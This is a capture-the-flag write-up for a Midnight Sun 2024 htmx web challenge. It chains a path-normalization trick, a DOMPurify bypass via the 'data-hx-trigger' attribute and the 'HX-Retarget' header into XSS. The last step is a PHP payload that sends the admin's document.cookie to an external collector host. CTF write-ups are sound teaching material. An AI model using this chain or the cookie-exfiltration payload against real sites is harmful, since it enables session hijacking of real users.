#xss #htmx
# MidnightSun24 - Modern
## Overview
It's a website that shows random images.
It uses **htmx**, that renders in the page html (after being sanitized by DOMPurify) returned by these endpoints: `/randomimage`,`/anything.png`, `/share/anything.png`.
`/anything.png` is reflected in the responses, but all the special chars are urlencoded.
## Road to flag
The goal is to achieve XSS and steal the admin's cookie.
## Exploitation
1. make the page request html to my server:
As all the reflected input is encoded, I have to find a way to serve html from my server.
`GET /share/kg49b8b5bnflog21q3i9au3c339uxlla.oastify.com/?.png` -> `<div hx-get="/kg49b8b5bnflog21q3i9au3c339uxlla.oastify.com/" hx-trigger="load" hx-target="#imagebox">`
If I could add `/` before the injected URL i could make requests to my server that returns the xss payload, but the webserver normalizes the paths.
Solutions:
- `/%5Cmyserver.com`
- `/%0d/myserver.com`

2. return infected html:
as the HTML is sanitized with DOMPurify, I searched for an htmx feature that lest to execute javascript: https://htmx.org/attributes/hx-trigger/
So i tried serving this HTML
```html
<div hx-trigger="load[alert(1)]">123</div>
```
but i got this error in the console:
```
Access to XMLHttpRequest at 'http://2dhcusr3.requestrepo.com/' from origin 'http://modern-1.play.hfsc.tf:8000' has been blocked by CORS policy: Request header field hx-request is not allowed by Access-Control-Allow-Headers in preflight response.
```
By adding `Access-Control-Allow-Headers: *` in the response our html is rendered but no XSS is fired, because **DOMPurify** gets rid of the attribute.

3. DOMPurify bypass
Looking at the htmx source code i discover that also the attribute `data-hx-trigger` is supported:
```js
function findElementsToProcess(elt) {
	if (elt.querySelectorAll) {
		var boostedSelector = ", [hx-boost] a, [data-hx-boost] a, a[hx-boost], a[data-hx-boost]";
		var results = elt.querySelectorAll(VERB_SELECTOR + boostedSelector + ", form, [type='submit'], [hx-sse], [data-hx-sse], [hx-ws]," +
			" [data-hx-ws], [hx-ext], [data-hx-ext], [hx-trigger], [data-hx-trigger], [hx-on], [data-hx-on]");
		return results;
	} else {
		return [];
	}
}
```
I serve:
```html
<div data-hx-trigger="load[alert(1)]">123</div>
```
This time DOMPurify doesn't get rid of the attribute but this isn't enough, the XSS didn't trigger.

4. Triggering the XSS
The content is rendered inside a `div` with the attribute `hx-disable`, that disables htmx processing its child elements.
In the [documentation](https://htmx.org/reference/#response_headers) I found the response header `HX-Retarget` that allows to target another DOM element for swapping, by swapping the body element the XSS should fire.
But no.
I discovered that the browser didn't consider the header because I didn't set `Access-Control-Expose-Headers`.
So by setting it:
```php
<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Headers: *');
header('Access-Control-Expose-Headers: *');
header('HX-Retarget: body');
?><div data-hx-trigger="load[fetch('//evdk17tp2bq4k8izy863sh1a61cs0jo8.oastify.com?c='+document.cookie)]">123</div>
```

Sent `http://modern-1.play.hfsc.tf:8000/share/%5C2dhcusr3.requestrepo.com` to the bot and got the flag:

`midnight{plz_d0n7_M@ke_M3_uzE_Re@cT_:(}`